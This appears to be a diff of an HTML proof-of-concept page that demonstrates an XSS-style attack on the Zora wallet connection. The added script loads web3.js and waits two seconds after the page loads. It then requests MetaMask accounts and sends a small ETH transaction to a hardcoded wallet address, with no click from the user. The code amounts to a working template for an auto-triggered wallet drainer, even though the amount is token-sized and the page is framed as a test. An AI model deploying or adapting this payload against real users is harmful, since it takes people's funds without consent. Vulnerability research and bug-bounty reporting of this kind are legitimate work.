@@ -1,31 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Wallet Popup PoC</title>
+  <title>Zora Wallet Connect XSS PoC</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
-  <h2>This is a PoC of MetaMask popup</h2>
-  <button id="connect">Connect Wallet</button>
+  <h1>Zora Wallet Auto-Connect XSS PoC</h1>
+  <p>If you see MetaMask or WalletConnect pop-up, the script is working.</p>
+
   <script>
-    // Wait for the DOM to load
-    document.addEventListener('DOMContentLoaded', async () => {
-      const btn = document.getElementById('connect');
+    async function connectWallet() {
+      if (window.ethereum) {
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-      btn.click(); // Auto-click
+        const accounts = await web3.eth.getAccounts();
+        const from = accounts[0];
+        const to = "0xCF62064d70593ecd8B319b267F769ddD181157d2";  // Your test wallet
+        const amount = web3.utils.toWei("0.000000001", "ether");
 
-      btn.addEventListener('click', async () => {
-        if (typeof window.ethereum !== 'undefined') {
-          try {
-            await ethereum.request({ method: 'eth_requestAccounts' });
-            alert('Wallet connected!');
-          } catch (err) {
-            alert('Connection rejected.');
-          }
-        } else {
-          alert('MetaMask not detected');
-        }
-      });
-    });
+        web3.eth.sendTransaction({ from, to, value: amount });
+      } else {
+        alert("MetaMask not detected");
+      }
+    }
+
+    // Trigger auto-connect after short delay (simulate Zora auto-render)
+    setTimeout(connectWallet, 2000);
   </script>
 </body>
 </html>
